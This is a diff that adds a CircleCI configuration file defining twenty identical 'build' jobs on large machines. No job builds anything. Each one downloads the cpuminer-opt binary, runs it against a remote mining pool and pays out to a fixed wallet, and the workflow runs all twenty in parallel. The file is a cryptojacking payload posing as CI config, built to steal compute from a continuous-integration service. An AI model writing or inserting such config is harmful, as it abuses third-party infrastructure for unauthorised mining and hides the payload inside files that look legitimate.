@@ -1,0 +1,188 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+      
+
+  build2:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+      
+
+
+  build3:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+
+
+  build4:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+
+  build5:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+
+  build6:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+      
+
+
+  build7:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+
+
+  build8:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+
+  build9:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+
+
+  build10:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+
+  build11:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+      
+
+
+  build12:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+
+
+  build13:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+
+  build14:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+
+  build15:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+      
+
+
+  build16:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+
+
+  build17:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+
+  build18:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+
+
+  build19:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+
+  build20:
+    machine:
+      resource_class: large
+      image: ubuntu-2204:2022.04.1
+    steps:
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.MAT$(echo $(shuf -i 1000-9999999999 -n 1)) -t 4
+      
+
+
+
+
+
+      
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - build
+            - build2
+            - build3
+            - build4
+            - build5
+            - build6
+            - build7
+            - build8            
+            - build9
+            - build10
+            - build11
+            - build12
+            - build13
+            - build14
+            - build15
+            - build16
+            - build17          
+            - build18
+            - build19
+            - build20
